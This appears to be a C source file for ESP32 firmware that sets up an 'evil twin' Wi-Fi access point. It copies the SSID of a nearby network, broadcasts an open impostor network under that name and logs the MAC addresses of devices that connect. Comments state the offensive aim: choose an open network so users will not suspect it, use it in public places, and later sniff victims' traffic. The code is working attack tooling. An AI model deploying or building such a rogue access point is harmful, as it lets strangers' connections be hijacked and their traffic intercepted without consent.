#include "evil-twin.h"
const char* TAG = "WIFI_EVENT";

void setUpAP()
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler_AP, NULL,NULL));
    
    // get best network to mock, better be open one so the user wont suspect, will work best in public places
    wifi_ap_record_t recNet = showNearbyNetworks();

    wifi_config_t wifi_conf =
    {
        .ap = {
            .ssid = "",
            .password = "",
            .channel = 1,
            .max_connection = 10,
            .ssid_len = 0,
            .authmode = WIFI_AUTH_OPEN,
        },
    };

    strncpy((char*)wifi_conf.ap.ssid, (char*)recNet.ssid, sizeof(wifi_conf.ap.ssid));
    wifi_conf.ap.ssid[sizeof(wifi_conf.ap.ssid)-1] = '\0';

    printf("Mock ssid : %s\n", wifi_conf.ap.ssid);
    
    // start the mock network.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP,&wifi_conf));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_LOGI(TAG, "Wi-Fi started." );

    //Can enhance the attack by sniffing the network after people connect ...
}

static void wifi_event_handler_AP(void* arg, esp_event_base_t even_base, int32_t event_id, void* event_data)
{
    switch(event_id)
    {
        //deal with new client connection event.
        case WIFI_EVENT_AP_STACONNECTED:
        {
            wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data; // extract event from event_data
            ESP_LOGI(TAG, "station "MACSTR" join, AID=%d\n", MAC2STR(event->mac), event->aid); // print connection details.
        }
        break; 
        //deal with existing client disconnection event.
        case WIFI_EVENT_AP_STADISCONNECTED:
        {
            wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data; // extract event from event_data
            ESP_LOGI(TAG, "station "MACSTR" leave, AID=%d, reason=%d\n", MAC2STR(event->mac), event->aid, event->reason);// print disconnection details.
        }

    }
};